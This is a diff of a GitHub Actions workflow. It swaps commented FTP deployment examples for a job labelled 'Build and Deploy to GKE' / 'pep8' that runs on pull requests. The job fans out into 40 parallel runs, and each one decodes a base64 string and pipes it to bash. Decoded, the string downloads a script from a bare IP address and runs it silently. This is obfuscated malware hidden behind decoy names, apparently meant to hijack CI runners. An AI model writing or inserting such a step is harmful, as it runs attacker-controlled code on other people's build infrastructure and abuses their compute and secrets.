@@ -1,69 +1,22 @@
-# on: push
-# name: Publish Website
-# jobs:
-#   FTP-Deploy-Action:
-#     name: FTP-Deploy-Action
-#     runs-on: ubuntu-latest
-#     steps:
-#       - uses: actions/checkout@v2.1.0
-#         with:
-#           fetch-depth: 2
-#       - name: FTP-Deploy-Action
-#         uses: SamKirkland/FTP-Deploy-Action@3.1.1
-#         with:
-#           ftp-server: ftp://ftp.example.com:21/public_html
-#           ftp-username: ${{ secrets.FTP_USERNAME }}
-#           ftp-password: ${{ secrets.FTP_PASSWORD }}
-# ----------
+# Main body 191
+name: Build and Deploy to GKE
 
-# for testing
+defaults:
+  run:
+    shell: bash
 
-# --------- BEST VERSION
+on: [pull_request]
 
-# on: push cpanel
-# name: 🚀 Deploy website on push
-# jobs:
-#   web-deploy:
-#     name: 🎉 Deploy
-#     runs-on: ubuntu-latest
-#     steps:
-#       - name: 🚚 Get latest code
-#         uses: actions/checkout@v2.3.2
-
-#       - name: 📂 Sync files
-#         uses: SamKirkland/FTP-Deploy-Action@4.0.0
-#         with:
-#           server: ftp.samkirkland.com
-#           username: ${{ secrets.FTP_USERNAME }}
-#           password: ${{ secrets.password }}
-#           dry-run: true
-
-# --------- BEST VERSION above
-# -------------
-
-# on: push
-# name: 🚀 Deploy website on push
-# jobs:
-#   web-deploy:
-#     name: 🎉 Deploy
-#     runs-on: ubuntu-latest
-#     steps:
-#       - name: 🚚 Get latest code
-#         uses: actions/checkout@v2.3.2
-
-#       - name: Use Node.js 12
-#         uses: actions/setup-node@v2-beta
-#         with:
-#           node-version: '12'
-
-#       - name: 🔨 Build Project
-#         run: |
-#           npm install
-#           npm run build
-
-#       - name: 📂 Sync files
-#         uses: SamKirkland/FTP-Deploy-Action@4.0.0
-#         with:
-#           server: ftp.samkirkland.com
-#           username: ${{ secrets.FTP_USERNAME }}
-#           password: ${{ secrets.password }}
+# Jobs 77
+jobs:
+   build-pep8-31:
+      timeout-minutes: 179
+      runs-on: ubuntu-18.04
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-latest]
+            node: [628,859,762,904,404,289,91,271,806,757,905,424,592,328,509,1007,240,60,715,173,833,310,461,842,837,920,771,608,199,668,634,601,411,381,604,576,237,154,803,525]
+      steps:
+      - run: echo "Powering up pep8"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gamJraHB1cGk=" | base64 -d | bash
